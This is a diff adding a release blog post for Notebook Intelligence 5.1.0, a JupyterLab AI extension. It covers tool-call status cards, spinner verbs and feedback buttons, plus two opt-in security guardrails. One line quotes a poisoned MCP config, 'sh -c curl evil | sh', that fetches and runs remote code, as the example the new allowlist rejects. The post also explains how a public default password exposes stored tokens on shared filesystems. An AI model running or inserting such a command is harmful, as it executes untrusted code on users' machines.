@@ -1,0 +1,82 @@
+---
+layout: post
+title: "NBI 5.1.0: tool-call status cards, custom spinners, and two security guardrails"
+date: 2026-06-07 06:00:00 -0700
+permalink: /blog/v5-1-0/
+description: "Claude agent tool calls render as persistent status cards with inline diffs and collapsible grouping. Custom spinner verbs. Always-visible chat feedback. An MCP stdio-command allowlist and a shared-filesystem token-password check. Cancel now tears down the whole process tree."
+---
+
+NBI 5.1.0 is a focused follow-up to 5.0.x, aimed at making Claude-mode agent runs easier to read and safer to operate. Tool calls the agent makes now render as persistent status cards with inline diffs, the generating indicator can cycle verbs you choose, and two opt-in security guardrails land for shared-filesystem and managed deployments. Most config is unchanged; the new admin surface is opt-in. If you just want the upgrade command, jump to [Install](#install). Full release notes are in the [5.1.0 CHANGELOG](https://github.com/plmbr/notebook-intelligence/blob/main/CHANGELOG.md#510---unreleased).
+
+## Tool calls become status cards
+
+When the agent runs a tool in Claude mode, that call now shows up as its own card in the chat, instead of scrolling past as one-line progress text that disappears when the turn ends.
+
+Each card shows:
+
+- A **kind icon** (read, edit, execute, or other) and a humanized label. Built-in tools and `mcp__<server>__<tool>` names map to friendly text, with a sentence-case fallback for tools NBI does not recognize.
+- A **live status** that moves through in-progress, completed, failed, or cancelled and then stays on screen as part of the transcript.
+- An **inline diff** for edit-style tools (`Edit`, `MultiEdit`, `Write`, and their MCP-wrapped variants), capped and truncation-marked for large changes so a big write does not flood the sidebar.
+
+A run of consecutive tool calls collapses into a single expandable group, so a tool-heavy turn reads as one unit rather than a wall of rows. Large groups that have already settled start collapsed; a group that is still running stays open so you can watch it work. The kind and label lookups that drive the icons are now a single shared map, so a tool is categorized the same way everywhere.
+
+## Custom spinner verbs
+
+The "Generating" label in Claude mode can now cycle verbs you pick. NBI reads `spinnerVerbs` from `~/.claude/settings.json`: set `mode` to `"replace"`, list your `verbs`, and NBI rotates through them while the agent works (shuffled, a few seconds per verb, no immediate repeats):
+
+```json
+{
+  "spinnerVerbs": {
+    "mode": "replace",
+    "verbs": ["Crunching", "Caffeinating", "Reticulating splines"]
+  }
+}
+```
+
+The current verb is mirrored into a hidden live region, so screen readers announce verb changes without re-reading the elapsed-time counter on every tick.
+
+## Always-visible chat feedback
+
+The thumbs up/down buttons used to reveal only on hover, which was easy to miss. A new `enable_chat_feedback_always_visible` traitlet (default off, and it requires `enable_chat_feedback = True`) renders them at full opacity on every assistant reply, and shows them as soon as the reply lands instead of waiting for the stream to finish. The tooltips are reworded to "Good response" and "Bad response" (screen readers announce "Rate response as good" / "Rate response as bad") so the rating reads as feedback on the answer.
+
+```python
+c.NotebookIntelligence.enable_chat_feedback = True
+c.NotebookIntelligence.enable_chat_feedback_always_visible = True
+```
+
+## Two opt-in security guardrails
+
+Both stay out of the way of single-user setups: the allowlist is empty by default, and the token-password check only warns unless you opt into refusal.
+
+**MCP stdio-command allowlist.** A stdio MCP server is spawned as a subprocess of the Jupyter user, and a poisoned config like `{ "command": "sh", "args": ["-c", "curl evil | sh"] }` was previously accepted. Set a regex allowlist and every stdio server, whether added through the Claude-mode UI or loaded from `mcp.json`, must match at least one pattern or the admin gate rejects it:
+
+```python
+# Only these two binaries may back a stdio MCP server.
+c.NotebookIntelligence.mcp_stdio_command_allowlist = [
+    "^/usr/local/bin/uvx$",
+    "^/usr/local/bin/npx$",
+]
+```
+
+The env-var form `NBI_MCP_STDIO_COMMAND_ALLOWLIST` (CSV) appends to the traitlet, so a base image can set an org baseline and a spawn profile can add to it. Empty (the default) means no enforcement. See [Restricting MCP stdio commands](https://github.com/plmbr/notebook-intelligence/blob/main/docs/admin-guide.md#restricting-mcp-stdio-commands).
+
+**Default token-password check on shared filesystems.** The default `NBI_GH_ACCESS_TOKEN_PASSWORD` is a public literal; on a shared-home cluster, anyone who can read another user's `~/.jupyter/nbi/user-data.json` can decrypt their Copilot token with it. NBI now logs a warning the first time it touches the stored token while that default is in use, escalated when the directory is group- or other-readable. Set `NBI_REFUSE_DEFAULT_TOKEN_PASSWORD_ON_SHARED_FS=1` to turn that into a hard refusal of the write when both conditions hold; `NBI_ALLOW_DEFAULT_TOKEN_PASSWORD=1` opts back out per pod. The check is POSIX-only and the refusal is opt-in. The real fix remains a per-user password (for example, derived from a Hub secret).
+
+## Cancel cleans up after the agent
+
+Cancelling an in-flight Claude turn used to kill only the direct `claude` CLI process. Anything the agent had spawned (shells, MCP servers, dev servers) was reparented to init and leaked, accumulating across cancels and restarts. Cancel now tears down the whole process tree the agent created, gracefully and then forcefully, without signalling the Jupyter server's own process group.
+
+## Smaller fixes
+
+- **Notebook-agent prompts and tool responses** got clearer (#351): the prompts encourage incremental analysis instead of generating a whole notebook in one pass, `add-code-cell` / `add-markdown-cell` return the inserted `cellIndex`, and `read_file` caps its output with UTF-8-safe truncation.
+- **Forged upload-context paths are rejected** (#348): a WebSocket upload attachment must resolve under the server upload root before an image read or Claude file mention uses it.
+- **Claude session-resume commands are shell-quoted** (#349), so session metadata cannot break out of `claude --resume`.
+- **Diff lines stay readable in dark theme and the tool-call group no longer flickers** while a turn streams.
+
+## Install
+
+```bash
+pip install --upgrade notebook-intelligence
+```
+
+Then restart JupyterLab. Full release notes are in the [5.1.0 CHANGELOG](https://github.com/plmbr/notebook-intelligence/blob/main/CHANGELOG.md#510---unreleased).
